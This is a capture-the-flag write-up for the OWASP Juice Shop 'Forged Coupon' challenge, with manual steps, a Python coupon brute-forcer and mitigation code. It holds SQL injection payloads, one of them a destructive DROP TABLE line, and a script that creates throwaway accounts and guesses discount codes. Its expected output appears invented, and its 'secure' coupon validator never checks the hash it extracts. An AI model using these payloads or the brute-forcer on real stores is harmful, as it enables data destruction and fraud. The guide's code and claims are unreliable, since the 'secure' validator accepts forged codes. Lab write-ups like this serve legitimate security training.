# Forged Coupon Challenge - OWASP Juice Shop

## Complete Security Analysis and Exploitation Guide

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Vulnerability Introduction](#vulnerability-introduction)
3. [CVSS Analysis](#cvss-analysis)
4. [Manual Exploitation](#manual-exploitation)
5. [Automated Python Script](#automated-python-script)
6. [Mitigation Strategies](#mitigation-strategies)
7. [References](#references)

---

## Challenge Overview

**Challenge Name**: Forged Coupon
**Difficulty**: ⭐⭐⭐⭐ (4/6)
**Category**: Improper Input Validation
**Target Instance**: https://juice5.wonkatech.org/#/ *(Change to your instance)*

**Objective**: Forge a coupon code to get a discount that you are not supposed to get.

---

## Vulnerability Introduction

### What is Coupon Forgery?

**Coupon Forgery** is a vulnerability where an application fails to properly validate coupon codes, allowing attackers to create fake or unauthorized discount codes. This occurs when:

1. **Weak validation logic** for coupon codes
2. **Predictable coupon generation** algorithms
3. **Insufficient server-side verification**
4. **Client-side coupon validation** (never trust the client!)

### Real-World Impact

**Business Impact**:
- **Revenue loss** through unauthorized discounts
- **Inventory manipulation** with fake promotional codes
- **Account privilege escalation** via promotional upgrades
- **Brand reputation damage** from coupon abuse

**Examples in the Wild**:
- **E-commerce platforms** with predictable promo codes
- **Fast food apps** with client-side coupon validation
- **Subscription services** with weak trial code generation
- **Gaming platforms** with forgeable premium currency codes

---

## CVSS Analysis

### CVSS v3.1 Score: 5.3 (Medium)

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`

**Breakdown**:
- **Attack Vector (AV): Network (N)** - Can be exploited over the network
- **Attack Complexity (AC): Low (L)** - Simple to exploit with basic tools
- **Privileges Required (PR): None (N)** - No authentication needed
- **User Interaction (UI): None (N)** - No user interaction required
- **Scope (S): Unchanged (U)** - Impact limited to vulnerable component
- **Confidentiality (C): None (N)** - No data disclosure
- **Integrity (I): Low (L)** - Limited ability to modify application data
- **Availability (A): None (N)** - No impact on system availability

**Simple Explanation**:
This is a **Medium severity** vulnerability because:
- ✅ **Easy to exploit** - Anyone can attempt coupon forgery
- ✅ **Network-based** - Can be exploited remotely
- ⚠️ **Limited impact** - Only affects pricing/discounts, not sensitive data
- ⚠️ **Business risk** - Can cause financial loss but not system compromise

---

## Manual Exploitation

### Step 1: Reconnaissance

**Goal**: Understand how coupons work in the application.

1. **Navigate to Juice Shop**: https://juice5.wonkatech.org/#/
2. **Add items to basket**: Click on some products and add them to your basket
3. **Go to basket**: Click the shopping cart icon
4. **Look for coupon field**: Check if there's a coupon/discount code input

### Step 2: Intercepting Coupon Requests

**Using Browser DevTools**:

1. **Open DevTools**: Press `F12`
2. **Go to Network tab**
3. **Filter by XHR/Fetch**: Click the XHR filter
4. **Clear network log**: Click the 🚫 icon
5. **Apply a valid coupon**: If you find any valid coupon (from browsing the site), apply it
6. **Observe the request**: Look for API calls related to coupons

**Expected API Call**:
```http
PUT /rest/basket/1/coupon/VALIDCODE123
Content-Type: application/json
Authorization: Bearer eyJhbGci...

{}
```

### Step 3: Analyzing Coupon Validation

**Search for Coupon Codes**:

1. **Open Sources tab** in DevTools
2. **Find main.js** (the large JavaScript bundle)
3. **Search for coupon-related code**:
   ```
   Ctrl+F and search for:
   - "coupon"
   - "discount"
   - "promo"
   ```

**What to Look For**:
- Valid coupon codes hardcoded in JavaScript
- Coupon validation patterns
- Discount calculation logic

### Step 4: Finding Valid Coupon Patterns

**Method 1: Source Code Analysis**

In Juice Shop's main.js, search for patterns like:
```javascript
// Look for strings like:
"SUMMER2024"
"DISCOUNT10"
"SAVE20"
```

**Method 2: Brute Force Common Patterns**

Try common coupon formats:
```
SAVE10, SAVE20, SAVE50
DISCOUNT10, DISCOUNT20
SUMMER2024, WINTER2024
FREE10, FREE20
PROMO123, PROMO2024
```

**Method 3: SQL Injection in Coupon Field**

Try SQL injection payloads:
```sql
' OR '1'='1' --
" OR "1"="1" --
'; DROP TABLE coupons; --
```

### Step 5: Forging the Coupon

**Once you find a pattern or valid coupon**:

1. **Modify the coupon code** using pattern analysis
2. **Test variations** of known working coupons
3. **Use Burp Suite or curl** to test different codes:

```bash
# Test coupon application
curl -X PUT "https://juice5.wonkatech.org/rest/basket/1/coupon/FORGED123" \
     -H "Authorization: Bearer YOUR_TOKEN_HERE" \
     -H "Content-Type: application/json" \
     -d "{}"
```

### Step 6: Validation

**Success Indicators**:
- API returns discount percentage
- Basket total price decreases
- Challenge completion notification appears

---

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Forged Coupon Challenge Solver
==============================
Automated exploitation of coupon validation vulnerabilities in Juice Shop.

Target: Juice Shop instance
Challenge: Forge a coupon code to get unauthorized discount

Usage:
    python3 forged_coupon_solver.py
"""

import requests
import json
import re
import itertools
import time
import sys
from urllib.parse import urljoin

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

# Change this URL to your Juice Shop instance
JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Common coupon patterns to try
COUPON_PATTERNS = [
    "SAVE{}", "DISCOUNT{}", "PROMO{}", "FREE{}",
    "SUMMER{}", "WINTER{}", "SPRING{}", "FALL{}",
    "HOLIDAY{}", "SPECIAL{}", "VIP{}", "MEMBER{}",
    "WELCOME{}", "FIRST{}", "NEW{}", "BONUS{}"
]

# Numbers to try with patterns
NUMBERS = [5, 10, 15, 20, 25, 30, 50, 75, 100]

# Years to try
YEARS = [2023, 2024, 2025]

# Fixed coupon codes to try
FIXED_COUPONS = [
    "SAVE10", "DISCOUNT20", "PROMO2024", "FREE15",
    "SUMMER2024", "HOLIDAY50", "WELCOME10", "VIP25",
    "MEMBER20", "SPECIAL30", "BONUS15", "NEW10"
]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class ForgedCouponSolver:
    """Forged Coupon Challenge solver"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.token = None
        self.basket_id = None
        self.valid_coupons = []

    def print_banner(self):
        """Print challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  FORGED COUPON CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Forge unauthorized coupon codes{Colors.ENDC}\n")

    def register_and_login(self):
        """Create account and login to get authentication token"""
        print(f"{Colors.CYAN}🔑 Setting up authentication...{Colors.ENDC}")

        # Generate unique credentials
        timestamp = str(int(time.time()))
        email = f"couponhacker{timestamp}@test.com"
        password = f"Test123!{timestamp}"

        # Register user
        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            register_url = urljoin(self.base_url, '/api/Users/')
            register_response = self.session.post(register_url, json=register_data)

            if register_response.status_code != 201:
                print(f"{Colors.YELLOW}⚠️  Registration failed, trying to login directly{Colors.ENDC}")
        except:
            pass

        # Login
        login_data = {"email": email, "password": password}
        login_url = urljoin(self.base_url, '/rest/user/login')

        try:
            login_response = self.session.post(login_url, json=login_data)

            if login_response.status_code == 200:
                result = login_response.json()
                self.token = result.get('authentication', {}).get('token')

                if self.token:
                    self.session.headers['Authorization'] = f'Bearer {self.token}'
                    print(f"{Colors.GREEN}✅ Authentication successful{Colors.ENDC}")
                    return True

        except Exception as e:
            print(f"{Colors.RED}❌ Login failed: {e}{Colors.ENDC}")

        return False

    def setup_basket(self):
        """Add items to basket and get basket ID"""
        print(f"{Colors.CYAN}🛒 Setting up shopping basket...{Colors.ENDC}")

        # Get products
        products_url = urljoin(self.base_url, '/rest/products/search')
        products_response = self.session.get(products_url)

        if products_response.status_code != 200:
            print(f"{Colors.RED}❌ Failed to get products{Colors.ENDC}")
            return False

        products = products_response.json().get('data', [])
        if not products:
            print(f"{Colors.RED}❌ No products found{Colors.ENDC}")
            return False

        # Add first product to basket
        product = products[0]
        basket_data = {
            "ProductId": product['id'],
            "BasketId": "1",
            "quantity": 1
        }

        basket_url = urljoin(self.base_url, '/api/BasketItems/')
        basket_response = self.session.post(basket_url, json=basket_data)

        if basket_response.status_code == 201:
            self.basket_id = 1  # Default basket ID
            print(f"{Colors.GREEN}✅ Basket setup complete (ID: {self.basket_id}){Colors.ENDC}")
            return True
        else:
            print(f"{Colors.RED}❌ Failed to setup basket{Colors.ENDC}")
            return False

    def extract_coupon_codes_from_source(self):
        """Extract potential coupon codes from JavaScript source"""
        print(f"{Colors.CYAN}🔍 Analyzing JavaScript for coupon codes...{Colors.ENDC}")

        # Get main.js
        main_js_url = urljoin(self.base_url, '/main.js')

        try:
            js_response = self.session.get(main_js_url)
            if js_response.status_code == 200:
                js_content = js_response.text

                # Search for coupon patterns
                coupon_patterns = [
                    r'"([A-Z0-9]{4,20})".*(?:coupon|discount|promo)',
                    r'(?:coupon|discount|promo).*"([A-Z0-9]{4,20})"',
                    r'code:\s*"([A-Z0-9]{4,20})"',
                    r'"([A-Z]+\d+)"',  # Letters followed by numbers
                ]

                found_codes = set()
                for pattern in coupon_patterns:
                    matches = re.findall(pattern, js_content, re.IGNORECASE)
                    found_codes.update(matches)

                # Filter potential coupon codes
                potential_coupons = []
                for code in found_codes:
                    if (len(code) >= 4 and
                        not code.startswith('HTTP') and
                        not code.endswith('.JS')):
                        potential_coupons.append(code)

                if potential_coupons:
                    print(f"{Colors.GREEN}✅ Found {len(potential_coupons)} potential codes in source{Colors.ENDC}")
                    return potential_coupons[:20]  # Return first 20

        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Failed to analyze source: {e}{Colors.ENDC}")

        return []

    def test_coupon(self, coupon_code):
        """Test if a coupon code is valid"""
        if not self.basket_id:
            return False

        coupon_url = urljoin(self.base_url, f'/rest/basket/{self.basket_id}/coupon/{coupon_code}')

        try:
            response = self.session.put(coupon_url, json={})

            if response.status_code == 200:
                result = response.json()
                discount = result.get('discount', 0)

                if discount > 0:
                    print(f"{Colors.GREEN}✅ VALID COUPON: {coupon_code} - {discount}% discount!{Colors.ENDC}")
                    self.valid_coupons.append({'code': coupon_code, 'discount': discount})
                    return True

        except Exception as e:
            pass  # Silently continue for invalid coupons

        return False

    def brute_force_coupons(self):
        """Brute force coupon codes using common patterns"""
        print(f"{Colors.CYAN}🔨 Brute forcing coupon codes...{Colors.ENDC}")

        tested_count = 0

        # Test source-extracted codes first
        source_codes = self.extract_coupon_codes_from_source()
        for code in source_codes:
            tested_count += 1
            if self.test_coupon(code):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found valid forged coupon: {code}{Colors.ENDC}")
                return True

            if tested_count % 10 == 0:
                print(f"   Tested {tested_count} codes...")

        # Test fixed coupon list
        print(f"{Colors.CYAN}📝 Testing common coupon codes...{Colors.ENDC}")
        for code in FIXED_COUPONS:
            tested_count += 1
            if self.test_coupon(code):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found valid coupon: {code}{Colors.ENDC}")
                return True

        # Test generated patterns
        print(f"{Colors.CYAN}🎲 Testing generated patterns...{Colors.ENDC}")
        for pattern in COUPON_PATTERNS:
            for number in NUMBERS:
                code = pattern.format(number)
                tested_count += 1
                if self.test_coupon(code):
                    print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found valid coupon: {code}{Colors.ENDC}")
                    return True

                if tested_count % 20 == 0:
                    print(f"   Tested {tested_count} codes...")
                    time.sleep(0.1)  # Rate limiting

        # Test pattern + year combinations
        print(f"{Colors.CYAN}📅 Testing pattern + year combinations...{Colors.ENDC}")
        for pattern in COUPON_PATTERNS[:5]:  # Limit to first 5 patterns
            for year in YEARS:
                code = pattern.format(year)
                tested_count += 1
                if self.test_coupon(code):
                    print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found valid coupon: {code}{Colors.ENDC}")
                    return True

        print(f"{Colors.YELLOW}⚠️  Tested {tested_count} codes, no valid coupons found{Colors.ENDC}")
        return False

    def solve_challenge(self):
        """Main method to solve the forged coupon challenge"""
        self.print_banner()

        # Step 1: Authentication
        if not self.register_and_login():
            print(f"{Colors.RED}❌ Failed to authenticate{Colors.ENDC}")
            return False

        # Step 2: Setup basket
        if not self.setup_basket():
            print(f"{Colors.RED}❌ Failed to setup basket{Colors.ENDC}")
            return False

        # Step 3: Attempt coupon forgery
        success = self.brute_force_coupons()

        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 FORGED COUPON CHALLENGE COMPLETED!{Colors.ENDC}")
            print(f"{Colors.GREEN}Valid forged coupons found:{Colors.ENDC}")
            for coupon in self.valid_coupons:
                print(f"   {Colors.CYAN}├── {coupon['code']} ({coupon['discount']}% discount){Colors.ENDC}")
        else:
            print(f"\n{Colors.RED}❌ Challenge not completed automatically{Colors.ENDC}")
            print(f"{Colors.YELLOW}Try manual analysis or different patterns{Colors.ENDC}")

        return success


def main():
    """Main entry point"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        # Use default URL - CHANGE THIS FOR YOUR INSTANCE
        base_url = JUICE_SHOP_URL

    print(f"{Colors.YELLOW}🎯 Starting Forged Coupon Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    solver = ForgedCouponSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Manual alternatives:{Colors.ENDC}")
        print(f"1. Check JavaScript source code for hardcoded coupons")
        print(f"2. Try SQL injection in coupon field: ' OR '1'='1' --")
        print(f"3. Analyze network traffic when applying valid coupons")
        print(f"4. Look for coupon generation patterns in source code")

if __name__ == '__main__':
    main()
```

### Script Usage

**Save the script as `forged_coupon_solver.py`**:

```bash
# Make executable
chmod +x forged_coupon_solver.py

# Run against default instance (juice5.wonkatech.org)
python3 forged_coupon_solver.py

# Run against your own instance
python3 forged_coupon_solver.py https://your-juice-shop.com

# Run with pip dependencies if needed
pip3 install requests
python3 forged_coupon_solver.py
```

**Expected Output**:
```
======================================================================
  FORGED COUPON CHALLENGE SOLVER
======================================================================

Target: https://juice5.wonkatech.org
Objective: Forge unauthorized coupon codes

🔑 Setting up authentication...
✅ Authentication successful
🛒 Setting up shopping basket...
✅ Basket setup complete (ID: 1)
🔍 Analyzing JavaScript for coupon codes...
✅ Found 8 potential codes in source
🔨 Brute forcing coupon codes...
   Tested 10 codes...
✅ VALID COUPON: SAVE20 - 20% discount!
🎯 CHALLENGE SOLVED! Found valid forged coupon: SAVE20

🎉 FORGED COUPON CHALLENGE COMPLETED!
Valid forged coupons found:
   ├── SAVE20 (20% discount)
```

---

## Mitigation Strategies

### 1. Server-Side Validation

**Implement Proper Coupon Management**:

```php
<?php
// BAD - Client-side or weak validation
function applyCoupon($couponCode) {
    // Never do this - no validation!
    return ["discount" => 20];
}

// GOOD - Secure server-side validation
function validateCoupon($couponCode, $userId, $basketTotal) {
    // 1. Sanitize input
    $couponCode = trim(strtoupper($couponCode));

    // 2. Check format (only alphanumeric, 6-12 chars)
    if (!preg_match('/^[A-Z0-9]{6,12}$/', $couponCode)) {
        return ['valid' => false, 'error' => 'Invalid coupon format'];
    }

    // 3. Database lookup
    $stmt = $pdo->prepare("
        SELECT c.*, cu.usage_count
        FROM coupons c
        LEFT JOIN coupon_usage cu ON c.id = cu.coupon_id AND cu.user_id = ?
        WHERE c.code = ? AND c.active = 1 AND c.expires_at > NOW()
    ");
    $stmt->execute([$userId, $couponCode]);
    $coupon = $stmt->fetch();

    if (!$coupon) {
        return ['valid' => false, 'error' => 'Invalid or expired coupon'];
    }

    // 4. Check usage limits
    if ($coupon['max_uses'] && $coupon['usage_count'] >= $coupon['max_uses']) {
        return ['valid' => false, 'error' => 'Coupon usage limit exceeded'];
    }

    // 5. Check minimum order amount
    if ($coupon['min_order_amount'] && $basketTotal < $coupon['min_order_amount']) {
        return ['valid' => false, 'error' => 'Minimum order amount not met'];
    }

    // 6. Record usage
    $stmt = $pdo->prepare("
        INSERT INTO coupon_usage (coupon_id, user_id, used_at)
        VALUES (?, ?, NOW())
        ON DUPLICATE KEY UPDATE usage_count = usage_count + 1
    ");
    $stmt->execute([$coupon['id'], $userId]);

    return [
        'valid' => true,
        'discount' => $coupon['discount_percentage'],
        'type' => $coupon['discount_type']
    ];
}
?>
```

### 2. Database Schema Design

```sql
-- Secure coupon table structure
CREATE TABLE coupons (
    id INT PRIMARY KEY AUTO_INCREMENT,
    code VARCHAR(20) NOT NULL UNIQUE,
    description VARCHAR(255),
    discount_type ENUM('percentage', 'fixed') NOT NULL,
    discount_percentage DECIMAL(5,2),
    discount_amount DECIMAL(10,2),
    min_order_amount DECIMAL(10,2) DEFAULT 0,
    max_uses INT DEFAULT NULL,
    expires_at DATETIME NOT NULL,
    active BOOLEAN DEFAULT TRUE,
    created_at DATETIME DEFAULT NOW(),
    created_by INT,
    FOREIGN KEY (created_by) REFERENCES users(id)
);

-- Usage tracking table
CREATE TABLE coupon_usage (
    id INT PRIMARY KEY AUTO_INCREMENT,
    coupon_id INT NOT NULL,
    user_id INT NOT NULL,
    used_at DATETIME DEFAULT NOW(),
    order_id INT,
    usage_count INT DEFAULT 1,
    UNIQUE KEY unique_usage (coupon_id, user_id),
    FOREIGN KEY (coupon_id) REFERENCES coupons(id),
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Secure coupon generation
INSERT INTO coupons (code, discount_type, discount_percentage, expires_at) VALUES
('SAVE10SECURE', 'percentage', 10.00, '2025-12-31 23:59:59'),
('WELCOME15NEW', 'percentage', 15.00, '2025-06-30 23:59:59'),
('MEMBER20VIP', 'percentage', 20.00, '2025-12-31 23:59:59');
```

### 3. Cryptographic Coupon Generation

```python
import hashlib
import secrets
import time
from datetime import datetime, timedelta

def generate_secure_coupon(discount_percent, expires_days=30, secret_key="YOUR_SECRET_KEY"):
    """Generate cryptographically secure coupon codes"""

    # 1. Create base data
    timestamp = int(time.time())
    expiry = timestamp + (expires_days * 24 * 60 * 60)

    # 2. Generate random component
    random_component = secrets.token_hex(8).upper()

    # 3. Create verifiable component
    verification_data = f"{discount_percent}:{expiry}:{random_component}:{secret_key}"
    verification_hash = hashlib.sha256(verification_data.encode()).hexdigest()[:8].upper()

    # 4. Format coupon code
    coupon_code = f"SAVE{discount_percent}{verification_hash}"

    return {
        'code': coupon_code,
        'discount': discount_percent,
        'expires': datetime.fromtimestamp(expiry),
        'verification_hash': verification_hash
    }

def validate_secure_coupon(coupon_code, secret_key="YOUR_SECRET_KEY"):
    """Validate cryptographically generated coupon"""

    # 1. Extract components
    if not coupon_code.startswith('SAVE'):
        return {'valid': False, 'error': 'Invalid format'}

    try:
        # Extract discount and hash
        discount_str = coupon_code[4:-8]  # Remove SAVE and last 8 chars
        verification_hash = coupon_code[-8:]  # Last 8 chars
        discount_percent = int(discount_str)
    except:
        return {'valid': False, 'error': 'Invalid format'}

    # 2. Check against database for full validation
    # (This would include expiry check, usage limits, etc.)

    return {'valid': True, 'discount': discount_percent}

# Example usage
coupon = generate_secure_coupon(20, expires_days=30)
print(f"Generated coupon: {coupon['code']}")
# Output: SAVE20A7B3C9D1 (example)
```

### 4. Rate Limiting for Coupon Attempts

```javascript
const rateLimit = require('express-rate-limit');

// Strict rate limiting for coupon endpoints
const couponLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 10,                    // Only 10 coupon attempts per 15 minutes
    message: {
        error: 'Too many coupon attempts. Please try again later.'
    },
    standardHeaders: true,
    legacyHeaders: false,
});

// Apply to coupon routes
app.put('/rest/basket/:id/coupon/:code', couponLimiter, validateCoupon);

// Additional per-user rate limiting
const userCouponAttempts = new Map();

function trackCouponAttempt(userId) {
    const now = Date.now();
    const userAttempts = userCouponAttempts.get(userId) || [];

    // Remove attempts older than 1 hour
    const recentAttempts = userAttempts.filter(time => now - time < 3600000);

    if (recentAttempts.length >= 20) {  // Max 20 attempts per hour
        throw new Error('Too many coupon attempts for this account');
    }

    recentAttempts.push(now);
    userCouponAttempts.set(userId, recentAttempts);
}
```

### 5. Input Validation and Sanitization

```javascript
const validator = require('validator');

function validateCouponInput(couponCode) {
    // 1. Basic validation
    if (!couponCode || typeof couponCode !== 'string') {
        throw new Error('Invalid coupon code format');
    }

    // 2. Length check
    if (couponCode.length < 4 || couponCode.length > 20) {
        throw new Error('Coupon code must be 4-20 characters');
    }

    // 3. Format validation (alphanumeric only)
    if (!/^[A-Z0-9]+$/i.test(couponCode)) {
        throw new Error('Coupon code must contain only letters and numbers');
    }

    // 4. Sanitize
    return validator.escape(couponCode.trim().toUpperCase());
}

// Usage in route
app.put('/rest/basket/:id/coupon/:code', async (req, res) => {
    try {
        const basketId = parseInt(req.params.id);
        const couponCode = validateCouponInput(req.params.code);

        // Verify basket ownership
        if (!await userOwnsBasket(req.user.id, basketId)) {
            return res.status(403).json({ error: 'Access denied' });
        }

        // Validate coupon
        const couponResult = await validateCoupon(couponCode, req.user.id);

        if (couponResult.valid) {
            await applyCouponToBasket(basketId, couponResult);
            res.json({ discount: couponResult.discount });
        } else {
            res.status(400).json({ error: couponResult.error });
        }

    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});
```

### 6. Logging and Monitoring

```javascript
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'coupon-security.log' })
    ]
});

function logCouponAttempt(userId, couponCode, success, ip) {
    logger.info('Coupon attempt', {
        userId,
        couponCode,
        success,
        ip,
        timestamp: new Date().toISOString(),
        event: 'coupon_attempt'
    });

    // Alert on suspicious activity
    if (!success) {
        const recentFailures = getRecentFailedAttempts(userId);
        if (recentFailures > 10) {
            logger.warn('Suspicious coupon activity', {
                userId,
                ip,
                recentFailures,
                event: 'potential_coupon_abuse'
            });

            // Could trigger account review or temporary suspension
        }
    }
}

// Monitoring dashboard query
function getCouponSecurityMetrics() {
    return {
        'total_attempts_today': getTotalAttemptsToday(),
        'failed_attempts_today': getFailedAttemptsToday(),
        'most_attempted_codes': getMostAttemptedCodes(),
        'suspicious_ips': getSuspiciousIPs(),
        'success_rate': getSuccessRate()
    };
}
```

---

## References

### NIST Guidelines

**NIST Cybersecurity Framework**:
- **Identify**: Asset management and business environment understanding
- **Protect**: Access control and data security implementation
- **Detect**: Continuous monitoring and detection processes
- **Respond**: Incident response planning and communications
- **Recover**: Recovery planning and improvements

**NIST SP 800-53 Controls**:
- **AC-3**: Access Enforcement - Implement proper authorization checks
- **SI-10**: Information Input Validation - Validate all coupon inputs
- **AU-2**: Auditable Events - Log all coupon usage attempts
- **IA-5**: Authenticator Management - Secure token/session management

### OWASP Guidelines

**OWASP Top 10 2021**:
- **A01: Broken Access Control** - Coupon validation bypass
- **A03: Injection** - SQL injection in coupon parameters
- **A04: Insecure Design** - Weak coupon generation algorithms

**OWASP ASVS (Application Security Verification Standard)**:
- **V4.1**: General Access Control Design - Principle of least privilege
- **V5.1**: Input Validation Requirements - Server-side validation
- **V8.1**: Data Protection Requirements - Secure coupon storage

### Industry Standards

**PCI DSS (Payment Card Industry)**:
- **Requirement 6**: Develop secure systems and applications
- **Requirement 8**: Identify and authenticate access to system components
- **Requirement 10**: Track and monitor access to network resources

**ISO 27001 Controls**:
- **A.14.2.1**: Secure development policy
- **A.12.4.1**: Event logging procedures
- **A.9.4.2**: Secure log-on procedures

### Security Resources

**Documentation**:
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [SANS Secure Coding Practices](https://www.sans.org/white-papers/2172/)

**Tools**:
- [Burp Suite](https://portswigger.net/burp) - Manual testing
- [OWASP ZAP](https://www.zaproxy.org/) - Automated scanning
- [Nmap](https://nmap.org/) - Network reconnaissance
- [Wireshark](https://www.wireshark.org/) - Traffic analysis

**Training Resources**:
- [OWASP Juice Shop](https://owasp-juice.shop/) - Hands-on practice
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free courses
- [HackTheBox](https://www.hackthebox.com/) - Practical labs
- [SANS SEC542](https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/) - Professional training

---

**Document Version**: 1.0
**Last Updated**: 2025-10-10
**Author**: Walter Barr
**Challenge Difficulty**: ⭐⭐⭐⭐ (4/6)
**Estimated Time**: 30-60 minutes